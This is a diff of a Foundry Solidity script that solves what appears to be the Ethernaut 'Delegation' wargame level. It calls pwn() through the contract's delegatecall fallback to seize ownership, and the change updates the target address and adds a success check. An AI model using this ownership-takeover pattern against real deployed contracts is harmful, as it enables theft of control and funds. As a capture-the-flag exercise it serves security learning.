@@ -7,14 +7,16 @@ import "forge-std/console.sol";
 
 contract DelegationSolution is Script {
 
-    Delegation public delegationInstance = Delegation(0xbee7ba2bba3C6A2A4433565154a3A16ab541aDB3);
+    Delegation public delegationInstance = Delegation(0x5717A8F61955b385B6a1AE226fE1f200A8527cE8);
 
     function run() external {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-        console.log("Owner before: ", delegationInstance.owner());
-        address(delegationInstance).call(abi.encodeWithSignature("pwn()"));
-        console.log("Owner after: ", delegationInstance.owner());
-        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));
+        
+        bytes memory data = abi.encodeWithSignature("pwn()");
+
+        (bool success,) = address(delegationInstance).call(data);
+        require(success, "nooooo" );
+
         vm.stopBroadcast();
     }
 }
